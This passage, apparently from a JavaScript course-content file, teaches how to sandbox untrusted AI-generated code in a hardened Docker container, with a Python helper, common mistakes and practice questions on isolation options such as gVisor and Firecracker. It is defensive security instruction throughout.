<li><b>Time limits</b>: run with a wall-clock timeout and kill the container if it exceeds it.</li></ul>
<p><b>Containers are not a perfect security boundary.</b> They share the host kernel, so a kernel vulnerability could allow escape. For stronger isolation of truly untrusted code, use <b>gVisor</b> (a user-space kernel that intercepts syscalls), <b>Firecracker</b> microVMs (lightweight real VMs, used by AWS Lambda), or WebAssembly runtimes. Run sandboxes on isolated infrastructure away from your production data and credentials, and never mount secrets or the Docker socket into them.</p>
<p><b>Operational hygiene</b>: use minimal base images, pin versions, give each job a fresh container, remove it afterwards (<code>--rm</code>), and log what ran. Treat the ability to run untrusted code as a sensitive capability with monitoring.</p>`,
    example: {
      t: "A hardened sandbox to run AI-generated tests, in code",
      intro: "A helper that runs untrusted code in a locked-down Docker container: no privileges, read-only root, no network, strict limits and a timeout. The flags are the lesson.",
      lang: "python",
      code: `import subprocess, tempfile, shutil
from pathlib import Path

HARDEN = [
    "--cap-drop", "ALL",                      # remove all Linux capabilities
    "--security-opt", "no-new-privileges",    # can't escalate privileges
    "--network", "none",                      # no network at all
    "--read-only",                            # image filesystem is read-only
    "--tmpfs", "/work:rw,size=64m,noexec",    # small writable scratch, no executing from it
    "--memory", "512m", "--memory-swap", "512m",
    "--cpus", "1",
    "--pids-limit", "128",                    # stop fork bombs
    "--user", "65534:65534",                  # run as 'nobody', never root
]

def run_untrusted(code: str, tests: str, timeout_s: int = 30) -> dict:
    work = Path(tempfile.mkdtemp())
    try:
        (work / "solution.py").write_text(code)
        (work / "test_solution.py").write_text(tests)
        cmd = ["docker", "run", "--rm", *HARDEN,
               "-v", f"{work}:/code:ro",        # mount the code READ-ONLY; scratch is the tmpfs
               "-w", "/work",
               "python:3.12-slim",
               "sh", "-c", "cp /code/*.py /work/ && python -m pytest -q --no-header"]
        try:
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_s)
        except subprocess.TimeoutExpired:
            return {"status": "timeout", "output": f"killed after {timeout_s}s"}
        out = p.stdout + p.stderr
        return {"status": "passed" if p.returncode == 0 else "failed", "output": out[-4000:]}
    finally:
        shutil.rmtree(work, ignore_errors=True)

# NEVER mount secrets, the Docker socket, or host directories with data into this container.
# For stronger isolation of truly untrusted code, run with gVisor (--runtime=runsc) or in a microVM,
# on infrastructure separate from production.
print(run_untrusted("def add(a, b): return a + b",
                     "from solution import add\\ndef test(): assert add(2, 3) == 5"))`,
      after: "Each flag closes one escape route: no network stops exfiltration, read-only plus tmpfs stops persistence, dropped capabilities and non-root stop privilege tricks, and the limits stop resource exhaustion. The timeout handles code that simply never finishes."
    },
    mistakes: [
      "Running untrusted code directly on the host or in an ordinary container with defaults.",
      "Mounting secrets, host data directories or the Docker socket into the sandbox (the socket is effectively host root).",
      "Allowing network access for code that doesn't need it, enabling exfiltration and attacks on other systems.",
      "No memory, CPU, PID or time limits, so a fork bomb or infinite loop takes down the host.",
      "Assuming a container is a complete security boundary; for truly untrusted code, add gVisor or microVMs and isolate the infrastructure."
    ],
    practice: [
      ["Match each risk to the flag that mitigates it: data exfiltration, persisting a backdoor in the image, a fork bomb, privilege escalation via setuid.", "Exfiltration: <code>--network none</code>. Persisting to the image: <code>--read-only</code> (plus a limited tmpfs). Fork bomb: <code>--pids-limit</code> (and <code>--memory</code>). Privilege escalation: <code>--cap-drop ALL</code> and <code>--security-opt no-new-privileges</code> (and non-root user)."],
      ["Why is mounting the Docker socket into a sandbox container especially dangerous?", "The Docker socket controls the Docker daemon, which runs as root on the host. Code that can reach it can start new privileged containers and effectively gain root on the host, defeating the sandbox entirely."],
      ["Containers share the host kernel. What stronger options exist for running truly untrusted code, and when would you use them?", "gVisor (a user-space kernel that intercepts syscalls, reducing kernel attack surface) and Firecracker microVMs (lightweight real VMs with a separate kernel). Use them when running arbitrary untrusted code at scale (code-execution platforms, AI agents running generated code), ideally on infrastructure isolated from production data."]
    ]
  }
});
